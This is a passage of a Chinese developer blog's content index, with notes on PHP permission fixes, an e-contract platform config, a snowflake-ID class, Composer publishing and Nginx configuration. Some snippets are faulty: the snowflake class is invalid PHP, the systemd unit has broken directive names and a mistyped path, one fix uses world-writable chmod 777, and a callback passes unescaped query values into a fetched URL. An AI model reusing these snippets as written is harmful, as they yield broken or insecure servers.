  overtrue/wechat 默认使用的是 symfony/cache 来进行缓存操作，ubuntu中，symfony/cache会在`/tmp`目录下建立`symfony_cache`来储存临时缓存。
  ps:如果不是/tmp目录，可以使用 sys_get_temp_dir() 方法获取你的临时文件目录。

  因为之前使用www-data用户运行的项目，所以symfony_cache目录已被www-data创建，且其他用户不可写，直接删掉这个目录或者修改权限就可以了！

  ```
  chmod -R 777 /tmp/symfony_cache
  ```

- **Throw问题**

  项目部署到Linux 服务器上后有时会出现 每日日志无法写入的问题。由此汇总一下常出现的问题及解决方式。

  **权限问题**

  导致无法写入日志的问题，是由于代码更新时添加了文件是 root 用户，所以创建日志文件也是root 权限，导致其它用户的 www 权限无法写入日志文件中。

  所以修改 storage/logs/ 的用户权限为 www

  **chown www:www storage/logs -R**

  注意：如果用户使用supervisord服务运行队列的话，如果队列里有日志记录，那么运行的用户也需要改成 www 用户。
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Supervisor</tag>
      </tags>
  </entry>
  <entry>
    <title>电子合同平台操作文档</title>
    <url>/2021/10/22/%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C/%E7%94%B5%E5%AD%90%E5%90%88%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%93%8D%E4%BD%9C%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[
## 电子合同平台操作

### 配置-报表配置:

#### 配置入口: 

`站点级: 智能云顶部->操作->系统配置->报表配置` / `系统级: qb软件->xml`

![image-20211020152208296](/images/imgs/电子合同平台/image-20211020152208296.png)

![image-20211020152318370](/images/imgs/电子合同平台/image-20211020152318370.png)

#### 新版配置案例:

> 配置具体作用请查询开发手册

```json
{
    "beforeCreateContract": {
        "column": "sign_target_id,sign_target_phone,sign_target_email",
        "sql": "SELECT k.ID as sign_target_id,k.kehushouji as sign_target_phone,if(ifnull(k.dzyx,'')='',x.jfdzyx,k.dzyx) sign_target_email FROM t_xsdd x left join t_kehu k on k.ID = x.khbh WHERE x.ID = '[OID]'"
    },
    "beforeSignPDF": [
        {
            "action": "camera",
            "camera": [
                {
                    "column": "id_card_front",
                    "chname": "身份证正面",
                    "remind": "请拍摄身份证正面",
                    "required": true
                },
                {
                    "column": "head_picture",
                    "chname": "头像",
                    "remind": "请拍摄本人头像"
                }
            ],
            "actionHook": {
                "sql": [
                    "update t_xsdd set htspg='[id_card_front],[head_picture]' where ID = '[OID]'"
                ],
                "api": []
            }
        }
    ],
    "afterSignPDF": {
        "needApproval": {
            "sql": [
                "UPDATE `t_xsdd` SET `htfj` = if(ifnull(htfj,'')='','[FILE_NAME]',concat(htfj,',','[FILE_NAME]')) ,updated_at=NOW() WHERE `ID` = '[OID]' AND _site = '[SITE]'"
            ],
            "api": [
                {
                    "target": "https://xxxxxx/api/v1.Api.Approve",
                    "post": {
                        "Func": "Core",
                        "Token": "88888888",
                        "Pack": {
                            "Builder": "[module]",
                            "Record_ID": "[OID]",
                            "User_ID": "[createuser]",
                            "Use_Site": "[SITE]",
                            "Action": "SUBMIT"
                        }
                    }
                }
            ]
        },
        "approveSuccess": {
            "sql": [],
            "api": [
                {
                    "target": "https://xxxxxx/api/push",
                    "post": {
                        "Package": {
                            "Version": "V1",
                            "Func": "SendEmail",
                            "Body": {
                                "config": {
                                    "MAIL_DRIVER": "smtp",
                                    "MAIL_HOST": "smtphz.qiye.163.com",
                                    "MAIL_PORT": "994",
                                    "MAIL_ENCRYPTION": "ssl",
                                    "MAIL_FROM_ADDRESS": "xxxxxx",
                                    "MAIL_FROM_NAME": "全筑e家",
                                    "MAIL_USERNAME": "xxxxxx",
                                    "MAIL_PASSWORD": "xxxxxx"
                                },
                                "from": "全筑e家",
                                "to": "[EMAIL]",
                                "message": "您好，感谢您对我公司的支持与信任！附件为您的合同文件，请查收。您线上签署的电子合同已经生效，此合同与纸质合同具有同等法律效力。谢谢~",
                                "title": "请查收您的合同文件",
                                "file": "[FILE_URL]"
                            }
                        }
                    }
                }
            ]
        }
    }
}
```

#### 配置分析:

-  该配置比普通电子签约多出一项 `beforeSignPDF`, 用于用户签约前验证信息的填写, 用户签约提交后会执行该项下`actionHook` 配置, 将验证信息通过SQL或接口存入指定字段

- 该配置`afterSignPDF`使用了第二种模式: 审批模式. 
  - 通过配置 下属 `needApproval` 项, 实现了将签约后文件存入对应单据字段, 且自动提交对应单据审批的动作. 
  - 通过配置 下属 `approveSuccess` 项, 提供了归档触发回调接口, 实现归档后自动修改推送状态为`审批完成`, 并发送配置邮件通知

### 配置-审批流程

#### 配置入口:

`智能云顶部->操作->系统配置->审批流程`

![image-20211020153526829](/images/imgs/电子合同平台/image-20211020153526829.png)

#### 配置案例:

- 无前置配置接口, 直接配置如下:

  ```
  [HTTP_DIR]/core/sign_report.php?opr=approveCallBack&type=[MODULE]&ID=[ID]
  ```

- 存在前置配置 , 修改对应文件, 加入如下代码: 

  ```php
  <?php
  	$showFileProtocol = ( (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || ( isset($_SERVER['HTTP_X_FORWARDED_PROTO'] ) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) ? 'https' : 'http';
  	# 请自行替换参数: type为当前模块, 替换ID为当前单据ID
  	$url = $showFileProtocol."://".$_SERVER['HTTP_HOST']."/core/sign_report.php?opr=approveCallBack&type={$_GET['type']}&ID={$_GET['ID']}";
  	file_get_contents($url);
  ```

### 操作流程

#### 业务人员发起签约

发起电子合同签约

![image-20211020155751967](/images/imgs/电子合同平台/image-20211020155751967.png)

确认信息后发送给用户

![image-20211020155828123](/images/imgs/电子合同平台/image-20211020155828123.png)

确认发送结果

![image-20211020155900876](/images/imgs/电子合同平台/image-20211020155900876.png)

#### 用户签约

用户打开链接查看合同

![image-20211021145427335](/images/imgs/电子合同平台/image-20211021145427335.png)

用户签约

![无标题](/images/imgs/电子合同平台/无标题.png)

#### 后台执行配置动作

##### 平台级别动作

- 修改签约清单对应模板记录为已签约, 并存储签约后合同及签名数据

  ![image-20211021151358186](/images/imgs/电子合同平台/image-20211021151358186.png)

- 修改推送记录中审批状态为 `审批中` 

  ![image-20211021151439787](/images/imgs/电子合同平台/image-20211021151439787.png)

##### 配置级别动作

- 存储验证图片到订单单据字段 `beforeSignPDF -> afterHook` 

  ![image-20211021150955258](/images/imgs/电子合同平台/image-20211021150955258.png)

- 存储签约后合同到订单单据字段就 `afterSignPDF -> needApprovel -> sql` 

  ![image-20211021151136475](/images/imgs/电子合同平台/image-20211021151136475.png)

- 提交对应订单单据审批 `afterSignPDF -> needApprovel -> api` 

  ![image-20211021151213782](/images/imgs/电子合同平台/image-20211021151213782.png)

#### 流程审批归档

完成归档后触发归档脚本接口

![image-20211021151607989](/images/imgs/电子合同平台/image-20211021151607989.png)

![image-20211021151624472](/images/imgs/电子合同平台/image-20211021151624472.png)

![image-20211021151712158](/images/imgs/电子合同平台/image-20211021151712158.png)

#### 后台执行动作

##### 平台级别动作

- 修改推送记录审批状态为 `审批通过` 

  ![image-20211021151840421](/images/imgs/电子合同平台/image-20211021151840421.png)

##### 配置级别动作

- 审批完成, 发送通知给用户 `afterSignPDF -> approveSuccess -> api`

  ![image-20211021152029270](/images/imgs/电子合同平台/image-20211021152029270.png)



### 扩展能力

#### 审批状态单据无法发起电子合同

![image-20211021152204118](/images/imgs/电子合同平台/image-20211021152204118.png)

#### 废弃当前合同重新签约

>  修改存储状态为废弃, 即可保证用户无法查看之前推送, 且可以在对应单据重新发起签约

![image-20211021152249944](/images/imgs/电子合同平台/image-20211021152249944.png)

![image-20211021152344740](/images/imgs/电子合同平台/image-20211021152344740.png)

![image-20211021152430706](/images/imgs/电子合同平台/image-20211021152430706.png)

]]></content>
      <categories>
        <category>开发手册</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>雪花算法实现</title>
    <url>/2020/12/12/%E7%AE%97%E6%B3%95/%E9%9B%AA%E8%8A%B1%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[
# 雪花算法实现

在laravel中实现雪花算法

----------------------------------------------

![1599733143891](/images/imgs/1599733143891.png)

```php
class SnowFake
{
	CONST START_TIME = '2020-01-01 00:00:00';       # 起始时间
    CONST MAX40_BIN_DEC = 1099511627775;
    CONST MAX12_BIN_DEC = 4095;
    CONST MAX10_BIN_DEC = 1023;

    STATIC LAST_MID = 0;       # 最新机器码
    STATIC SEQUENCE_NUM = 0;   # 最新序列码

	
    /**
     * @desc 雪花算法生成唯一ID,
     *       支持从开始时间约69年时间内,
     *       1024台机器,每秒4096000个唯一ID
     * @return float|int|string
     */
    public static function Union_Id(){
        $first_bin = '0';                       # 1/64 符号位
        $now_time = floor(microtime(true) * 1000);
        $start_time = strtotime(self::START_TIME) * 1000;
        $diff_time = $now_time - $start_time;
        $diff_time_bin = base_convert($diff_time, 10, 2);
        $diff_time_bin = str_pad($diff_time_bin,41,'0', STR_PAD_LEFT);
        $second_bin = $diff_time_bin;           # 2-42/64 时间戳位
        self::setSequence();
        self::getMid();
        $mid_bin = decbin(self::$LAST_MID);
        $third_bin = str_pad($mid_bin, 10, '0', STR_PAD_LEFT);          # 42-52/64 数据中心+机器码位
        $sequence_bin = decbin(self::$SEQUENCE_NUM);
        $forth_bin = str_pad($sequence_bin, 12, '0', STR_PAD_LEFT);     # 52-64/64 序列编号位
        $union_bin = $first_bin . $second_bin . $third_bin . $forth_bin;
        $bin_dec = base_convert($union_bin,2,10);
        return $bin_dec;
    }
    
    
    private static function getMid()
    {
//        $machine_code = config('original.Machine_Code');
//        if ($machine_code < 1 || $machine_code > 1023) {
//            self::Error(5018,['env Config: MACHINE_CODE error, must be int between 1 and 1023']);
//        }
//        self::$LAST_MID = $machine_code;
        if (self::$SEQUENCE_NUM >= self::MAX12_BIN_DEC){
            self::$LAST_MID ++;
            if (self::$LAST_MID > self::MAX10_BIN_DEC){
                self::$LAST_MID = 0;
            }
        }
    }

    private static function setSequence()
    {
        self::$SEQUENCE_NUM ++;
        if (self::$SEQUENCE_NUM > self::MAX12_BIN_DEC){
            self::$SEQUENCE_NUM = 0;
        }
    }
}

```

]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Composer包从零搭建</title>
    <url>/2021/08/13/Composer%E5%8C%85%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[
# Composer搭建

搭建一个自己的PHP Composer包并发布

## Git操作

### 1.Git创建仓库

进入Git页面, 创建仓库

![image-20211113192619005](/images/imgs/Composer包搭建/image-20211113192619005.png)

### 2.克隆该仓库到本地

```
git clone git@github.com:NI9NE/excelexport.git
```

![image-20211113192914990](/images/imgs/Composer包搭建/image-20211113192914990.png)

### 3.初始化composer包

```
composer init
```

![image-20211113193005218](/images/imgs/Composer包搭建/image-20211113193005218.png)

![image-20211113193248507](/images/imgs/Composer包搭建/image-20211113193248507.png)

> 暂不定义包依赖, 后续编写逻辑时再添加

### 4.编写包类逻辑

依照psr-4规范创建对应目录, 加入逻辑

![image-20211113200840420](/images/imgs/Composer包搭建/image-20211113200840420.png)

在 composer.json 文件中加入包依赖并注册类命名空间

![image-20211113194837850](/images/imgs/Composer包搭建/image-20211113194837850.png)

编写测试使用demo

```
需要先安装依赖包  composer install
```

![image-20211113200942087](/images/imgs/Composer包搭建/image-20211113200942087.png)

运行测试是否成功

![image-20211113201001589](/images/imgs/Composer包搭建/image-20211113201001589.png)

### 5.上传Git

```
git add .
git commit -m 'init'
git push 
```

![image-20211113201104246](/images/imgs/Composer包搭建/image-20211113201104246.png)

### 6.添加tag并发布release

打标签(版本号规则请查看文档)

```
git tag v1.0.0
git push origin v1.0.0
```

![image-20211113201339556](/images/imgs/Composer包搭建/image-20211113201339556.png)

发布Realease

![image-20211113201457927](/images/imgs/Composer包搭建/image-20211113201457927.png)

![image-20211113201536914](/images/imgs/Composer包搭建/image-20211113201536914.png)

## composer发布操作

### 1.登录packagist.org

![image-20211113201730169](/images/imgs/Composer包搭建/image-20211113201730169.png)

### 2.发布包

![image-20211113201820239](/images/imgs/Composer包搭建/image-20211113201820239.png)

### 3.发布完成

![image-20211113201916645](/images/imgs/Composer包搭建/image-20211113201916645.png)

## 测试使用该composer包

### 1.安装发布的composer包

> 推荐使用国内composer镜像源, 否则可能拉取失败

```
composer require ni9ne/excelexport
```

![image-20211113202052070](/images/imgs/Composer包搭建/image-20211113202052070.png)

### 2.编写使用代码,运行测试

![image-20211113202314900](/images/imgs/Composer包搭建/image-20211113202314900.png)

## 后续发布版本

后续变更只需要变更后提交修改, 打好tag, 发布release, composer会通过githook自动实现版本发布

![image-20211113202443901](/images/imgs/Composer包搭建/image-20211113202443901.png)]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Composer</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx服务器基础配置00</title>
    <url>/2021/06/21/Nginx/Nginx00%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[
## Nginx服务器基础配置实例

### 1.准备测试素材文件

![image-20211116191534027](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211116191534027.png)

### 2.替换编写nginx.conf文件

```nginx
user www-data;

worker_processes 2;

error_log /var/www/nginx_test/log/error.log;

daemon on;

events {
    accept_mutex on;
    multi_accept on;
    worker_connections 1024;
    use epoll;
}

http {
    sendfile on;
    include mime.types;
    default_type application/octet-stream;
    keepalive_timeout 65;
    log_format server1 '=====> server1 access log format';
	log_format server2 '=====> server2 access log format';

    include /etc/nginx/conf.d/conf.d/*.conf;

}
```

### 3.编写两个服务文件

#### server1.conf 

```nginx
server {
    listen 8081;

    server_name nginx.conf.test;

    access_log /var/www/nginx_test/server1/logs/access.log server1;
    
    location /server1/location1{
        root /var/www/nginx_test;
        index index_sr1_location1.html;
    }

    location /server1/location2{
        root /var/www/nginx_test;
        index index_sr1_location2.html;
    }

    error_page 404 /404.html;

    location = /404.html{
        root /var/www/nginx_test;
        index 404.html;
    }
}
```

#### server2.conf

```nginx
server {
    listen 8082;

    server_name nginx.conf.test;

    access_log /var/www/nginx_test/server2/logs/access.log server2;
    
    location /server2/location1{
        root /var/www/nginx_test;
        index index_sr2_location1.html;
    }

    location /server2/location2{
        root /var/www/nginx_test;
        index index_sr2_location2.html;
    }

    error_page 404 /404.html;

    location /404.html{
        root /var/www/nginx_test;
        index 404.html;
    }
}
```

### 4.重新加载启动nginx服务

```shell
sudo nginx -s reload
```

### 5.测试结果

![image-20211116192129333](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211116192129333.png)





## Nginx操作优化

### Nginx配置系统服务

```shell
sudo vim /usr/lib/systemd/system/nginx.service
```

```
[Unit]
Description=nginx web service
Documentation=http://nginx.org/en/docs/
After=network.target
[service]
Type=forking
PIDFile=/usr/local/nginx/logs/nginx.pid
ExecstartPre=/usr/local/nginx/sbin/nginx -t -c /usr/loca1/nginx/conf/nginx.conf
Execstart=/usr/local/nginx/sbin/nginx
ExecReload=/usr/local/nginx/sbin/nginx -s reload
Execstop=/usr/local/nginx/sbin/nginx -s stop
PrivateTmp=true
[Install]
WantedBy=default.target
```

```shell
sudo chmod 755 /usr/lib/systemd/system/nginx.service
```

使用系统命令执行nginx服务

```shell
systemctl start nginx  		# 启动
systemctl stop nginx		# 停止
systemctl restart nginx		# 重启
systemctl reload nginx 		# 重载配置
systemctl status nginx		# 查看状态
systemctl enable nginx		# 开机启动
```

> 本机测试用系统安装时已自行配置, 可直接使用systemctl操作nginx

### Nginx命令配置到系统环境

```shell
sudo vim /etc/profile
```

```
最后一行添加
export PATH=$PATH:/usr/local/nginx/sbin
```

```shell
source /etc/profile
```

> 本机测试用系统安装时已自行配置, 可直接用nginx命令

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx静态资源部署优化_部署01</title>
    <url>/2021/06/21/Nginx/Nginx01%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[
## Nginx静态资源部署

### 1.nginx静态资源配置指令

#### listen 用于配置监听端口

##### 指令语法

`listen address[:port] [default_server] ...` / `listen port [default_server]...`

##### 指令文档

```
http://nginx.org/en/docs/http/ngx_http_core_module.html#listen
```

##### 用例

```
listen 127.0.0.1:8080;
listen 127.0.0.1;
listen 8080;
listen *:8080;
```

##### default_server

> 默认主机标识符, 即没有匹配到对应的address:port时, 默认执行的server块
>
> 若不指定, 默认使用第一个server

```
listen 8080 default_server; # 当前监听所在server块为默认服务
```

#### server_name 用于设置虚拟主机服务名称

##### 指令语法

`server_name  name1 [name2...]`  中间用空格分隔

##### 指令文档

```
http://nginx.org/en/docs/http/ngx_http_core_module.html#server_name
```

##### 匹配方式

- 精确匹配

  ```
  server{
  	listen 80;
  	server_name www.host1.com www.host2.com;
  }
  ```

- 匹配通配符

  > `*` 可以放在域名首段或者尾段, 但不能出现在域名中间

  ```
  server{
  	listen 80;
  	server_name *.host1.com www.host2.*;
  }
  ```

- 正则匹配

  > `~` 为正则表达式开启标记

  ```
  server{
  	listen 80;
  	server_name ~^www\.(\w+)\.com$;
  	return 200 $1;
  }
  ```

##### 匹配执行顺序

精确匹配 > 前通配符 > 后通配符 > 正则匹配 > 默认server

#### location 用于设置请求URI

##### 指令语法

`location [ = | ~ | ~* | ^~ | @ ] uri{...}`

> 以匹配度最高的路由作为实际转发路由

##### 指令文档

```
http://nginx.org/en/docs/http/ngx_http_core_module.html#location
```

##### 匹配方式

- 以指定模式访问

  ```
  server{
  	listen 80;
  	server_name 127.0.0.1;
  	location /abc{
  		default_type text/plain;
  		return 200 'access success';
  	}
  }
  ```

  ```
  则如下方式均可访问
  http://127.0.0.1/abc
  http://127.0.0.1/abc?p1=test
  http://127.0.0.1/abcde
  ```

- 以精确匹配模式访问(不含正则)

  ```
  server{
  	listen 80;
  	server_name 127.0.0.1;
  	location =/abc{
  		default_type text/plain;
  		return 200 'access success';
  	}
  }
  ```

  ```
  则以下方式可访问:
  http://127.0.0.1/abc
  http://127.0.0.1/abc?p1=test
  以下无法访问:
  http://127.0.0.1/abc/
  http://127.0.0.1/abcde
  ```

- 以正则匹配模式访问

  `~ `  : 用于表示当前URI中包含正则, 且区分大小写

  `~*` : 用于表示当前URI包含正则, 且不区分大小写

  ```
  server{
  	listen 80;
  	server_name 127.0.0.1;
  	# location ~*^/abc\w${	# 不区分大小写
  	location ~^/abc\w${
  		default_type text/plain;
  		return 200 'access success';
  	}
  }
  ```

  ```
  则以下方式可访问:
  http://127.0.0.1/abcd
  以下无法访问:
  http://127.0.0.1/abc
  http://127.0.0.1/abc/
  http://127.0.0.1/abcde
  ```

- 匹配后停止

  `^~` : 用于不包含正则的URI前, 功能和不加符号的一致, 表示如果模式匹配, 就停止搜索其他模式

  ```
  server{
  	listen 80;
  	server_name 127.0.0.1;
  	location ^~/abcd{
  		default_type text/plain;
  		return 200 'abcd access success';
  	}
  	location ~^/abc\w${
  		default_type text/plain;
  		return 200 'access success';
  	}
  }
  ```

  ```
  http://127.0.0.1/abcd
  访问到第一个location块后匹配, 就不再向后搜索, 直接使用该URI
  ```

- nginx内部跳转

  `@` 表示在nginx中跳转到对应的location

  ```
  location /404 {
  	error_page 404 @404_error;
  }
  location @404_error {
  	...
  }
  ```

#### root/alias 设置请求资源的目录

##### 指令语法

`root path`  设置请求的根目录

```
root html;
```

`path` 为Nginx服务器收到请求后查找资源的根目录路径

`alias path`  用于更改location的URI

`path` 为修改后的根目录

##### root/alias 区别

```
root  处理结果为: root路径+location路径
alias 处理结果为: 使用alias路径替换location路径
```

```
以下三个配置功效相同
location /images {
	root /var/www/test;	# 结果为: /var/www/test/images
}

location /images {
	alias /var/www/test/images;	# 替换原有images为 /var/www/test/images
}
location /images/ {
	alias /var/www/test/images/;# 替换原有images/为 /var/www/test/images/
}
```

#### index 用于设置网站的默认首页

##### 指令语法

`index file;`

```
index index index.html;
```

> index 后可以跟多个设置, 如果访问URI没有指定具体访问的资源, 则会依次查找, 直到找到第一个

##### 指令位置

```
http / server / location
```

如:

```
location / {
	root /var/www/test;
	index index index.html index.htm;
}
访问时, 可以直接使用 http://test.project.com 访问, 后面不加任何参数
```

#### error_page 设置网站的错误页面

##### 指令语法

`error_page code ...[=[reponse]] rui;`

##### 指令位置

```
http / server / location
```

##### 实例

```
1. 具体跳转页面地址
server {
	error_page 404 http://test.project.com/404.html;
}
2. 指定重定向地址
server {
	error_page 404 /50x.html;
	error_page 500 502 503 504 /50x.html;
	location =/50x.html{
		root html;
	}
}
3. 使用location的@符号完成错误信息展示
server {
	error_page 404 @to_error_page;
	location @to_error_page{
		default_type text/plain;
		return 404 'Not Found Page!';
	}
}
```

##### response

可选项 `=[response]` 用于将匹配状态码改为另一个状态码返回浏览器

```
server{
	error_page 404 =200 /50x.html;
	location =/50x.html{
		...
	}
}
```

### 2.nginx静态资源优化配置语法

#### sendfile

`sendfile on|off` 用于开启高效文件传输模式

![image-20211118235723693](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211118235723693.png)

![image-20211118235844001](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211118235844001.png)

```
使用sendfil()之后, 减少了两次copy(), 以及用户态与内核态切换的耗费
```

#### tcp_nopush

`tcp_nopush on|off`

用于提升网络包的传输效率, 必须在sendfile打开的状态下才会生效

#### tcp_nodelay

`tcp_nodelay on|off`

用于提高网络包传输的实时性, 必须在keep-alive 连接开启时才生效

![image-20211119001043741](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211119001043741.png)

```
tcp_nopush和tcp_nodelay在linux 2.5.9之后可以兼容, 两者都开启可以大大加快数据传输效率
```
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx静态资源部署优化_压缩02</title>
    <url>/2021/06/21/Nginx/Nginx02%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[
## Nginx静态资源压缩

在Nginx的配置文件中可以通过gzip来对静态资源进行压缩

```
ngx_http_gzip_module模块		# nginx自带
ngx_http_gzip_static_module模块	# 需要安装
ngx_http_gunzip_module模块		# 需要安装
```

### Gzip各模块支持配置指令

以下指令都来自于ngx_http_gzip_module模块支持, 该模块nginx内置, 可以直接使用

```
模块文档: http://nginx.org/en/docs/http/ngx_http_gzip_module.html
```

#### gzip 

`gzip on|off`  用于开启或关闭gzip功能

```
http{
	gzip on;
}
```

> 可以用于http/server/loaction

#### gzip_types

`gzip_types mime-type ...` 设置需要压缩的文件mime类型

默认压缩text/html 

```
http{
	gzip_types application/javascript;
}
```

> 所选值可以从mime.types文件中查找, 也可以使用* 代表所有类型, 但不推荐

#### gzip_comp_level 

`gzip_comp_level level` 设置Gzip压缩程度

级别从1到9, 压缩程度上升, 压缩效率降低, 9 代表压缩程度最高, 但效率最低

```
http{
	gzip_comp_level 6;
}
```

#### gzip_vary 

`gzip_vary on|off ` 设置是否携带gzip响应头

`gzip_vary` 用于设置进行压缩发送是否携带 `Vary:Accept-Encoding` 响应头, 告诉接收方该资源经过了Gzip压缩处理

```
http{
	gzip_vary on;
}
```

> 可用于http/server/location

#### gzip_buffers

`gzip_buffers number size` 用于设置压缩的缓冲区数量及大小

该值设定一般和服务器操作系统有关, 一般使用默认值即可

```
http{
	gzip_buffers 4 16k;
}
```

#### gzip_disable

`gzip_disable regex ..` 用于使用正则针对不同的浏览器禁用Gzip功能

regex匹配`Request Headers`中`User-Agent` 数据

```
http{
	gzip_disable "MSIE [1-6]\."; # 排除IE6以下版本
}
```

#### gzip_http_version

`gzip_http_version 1.0|1.1`  针对不同的HTTP协议版本, 选择性开启或关闭gzip

该指令用于指定最低HTTP协议版本, 一般用默认值即可

```
http{
	gzip_http_version 1.1;
}
```

#### gzip_min_length

`gzip_min_length` 指定需要压缩的最小文件长度

默认20, 从头信息中的`Content-Length`中获取

```
nginx 计量但对: bytes[字节] / kb[千字节] / M[兆]
如: 1024 / 10k / 10m
```

```
http{
	gzip_min_length 20;
}
```

#### gzip_proxied

`gzip_proxied off|expired|no-cache|no-store|private|no_last_modified|no-etag|auth|any` 设置是否对服务端返回结果进行Gzip压缩

> 反向代理相关

- off  关闭nginx服务器对后台服务器返回结果的压缩, 忽略其他参数
- expired  启用压缩, 如果响应头headers头中包含`Expires` 头信息
- no-cache  启用压缩, 如果响应头headers头中包含`Cache-Control:no-cache`头信息
- no-store  启用压缩, 如果响应头headers头中包含`Cache-Control:no-store`头信息
- private  启用压缩, 如果响应头headers头中包含`Cache-Control:private`头信息
- no-last-modified  启用压缩, 如果响应头headers头中不包含`Last-Modified` 头信息
- no-etag  启用压缩, 如果响应头headers头中不包含 `ETag` 头信息
- auth  启用压缩, 如果响应头headers头中包含`Authorization` 头信息
- any  为所有代理请求无条件启用压缩

### Gzip压缩功能配置

编辑新建nginx_zip.conf文件

```
gzip on;			# 开启gzip功能
gzip_types *;		# 压缩文件类型,mime-type
gzip_comp_level 6;	# gzip 压缩等级
gzip_min_length 1024;# 需要进行压缩响应页面的最小长度 content-length
gzip_buffers 4 16k;	# 缓存空间数量及大小
gzip_http_version 1.1;# 指定压缩响应需要的最低HTTP协议版本
gzip_vary on;		# 向响应头中添加压缩表示
gzip_disable "MSIE [1-6]\.";	# 过滤浏览器禁用压缩
gzip_proxied off;	# nginx作为反向代理压缩服务端返回数据的条件
```

将配置文件引入nginx.conf

```
include nginx_zip.conf;
```

### Gzip和sendfile的冲突解决

Gzip需要应用程序用户态进行操作文件并压缩发送, 但sendfile是直接从内核缓冲区发送到Socket缓冲区的, 会导致功能冲突

可以使用`ngx_http_gzip_static_module` 模块的 `gzip_static` 指令解决问题

![image-20211119012700914](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211119012700914.png)

解决方案是在请求资源之前, 就将资源压缩, `jquery.js` 压缩为 `jquery.js.gz`, 在用户请求资源时, 发送压缩后的文件给用户, 由浏览器进行解压缩显示

#### gzip_static

`gzip_static on|off|always;` 

访问与资源同名的`.gz` 文件时, response中以gzip相关的header返回`.gz`文件内容

> 添加上述命令后, 若报错 unknown directiove 'gzip_static', 原因是Nginx默认没有添加对应模块, 需要手动安装 ./configure --with-http_gzip_static_module

```
http{
	gzip_static on;
}
```

```shell
gzip /var/www/test/images/jquery.js
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx静态资源部署优化_缓存、跨域、防盗链03</title>
    <url>/2021/06/21/Nginx/Nginx03%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%BC%93%E5%AD%98%E3%80%81%E8%B7%A8%E5%9F%9F%E3%80%81%E9%98%B2%E7%9B%97%E9%93%BE/</url>
    <content><![CDATA[
## 静态资源缓存处理

> web 缓存: 一个web资源存在于web服务器和客户端之间的副本

### web缓存分类

```
客户端缓存
	浏览器缓存 - 浏览器在用户磁盘上的资源缓存
服务端缓存
	Nginx/Redis/Memcache等
```

###  浏览器缓存执行流程

HTTP协议中与页面缓存相关的字段:

| headers       | 说明                                |
| ------------- | ----------------------------------- |
| Expires       | 缓存过期的日期时间                  |
| Cache-Control | 设置缓存相关配置信息                |
| Last-Modified | 请求资源最后修改时间                |
| ETag          | 请求实体标签的当前值, 如文件的MD5值 |

![image-20211120005659396](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120005659396.png)

```
强缓存: 直接从浏览器端使用缓存, 不与服务端交互
协商缓存: 发现本地缓存过期后, 发送请求与服务端协商, 服务端判定资源未发生变化, 返回304, 仍使用浏览器缓存
```

### Nginx浏览器缓存指令

Nginx实现对应缓存设置, 需要如下指令

#### expires

用于控制页面资源过期时间, 可以通过控制HTTP响应头中的`Expires` 和 `Cache-Control` 实现

##### 指令格式

`expires [modified] time;  ||  expires epoch|max|off;`

```
time: 可以为任意整数指定过期时间, 单位为秒. 
	如果是负数, Cache-Control值设定为no-cache
	如果为正数或0, 则Cache-Control被设定为max-age=time
epoch: 指定Expires值为'1 January,1970,00:00:00 GMT', 即1970-01-01 00:00:00,
	Cache-Control值为no-cache
max: 指定Expires值为'31December,2037,23:59:59 GMT', 即2037-12-31 23:59:59
	Cache-Control值为315360000 (10年)
off: 不缓存
```

> 注: HTTP响应头中, Expires和Cache-Control共同控制缓存过期配置. 
>
> 其中, Expires为1.0版本协议, 使用GMT时间对照浏览器与服务器资源过期时间, 在时间配置不同步时会出现问题.
>
> 所以在1.1版本中, 使用Cache-Control:max-age=time, 以相对时间对照过期时间, 实现资源缓存的配置

##### 指令配置

```nginx
location ~ .*\.(html|js|css|png)${
    expires 1000;
}
```

![image-20211120012032536](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120012032536.png)

#### add_header

用于添加HTTP响应头信息, 值

##### 指令语法

`add_header name value [always];`

```
其中缓存配置主要修改Cache-Control值, 值包括:
must-revalidate		可缓存但必须向服务器进行确认协商
no-cache			指示请求或响应消息不能缓存,不是说可以设置不缓存,而是需要和服务器确认
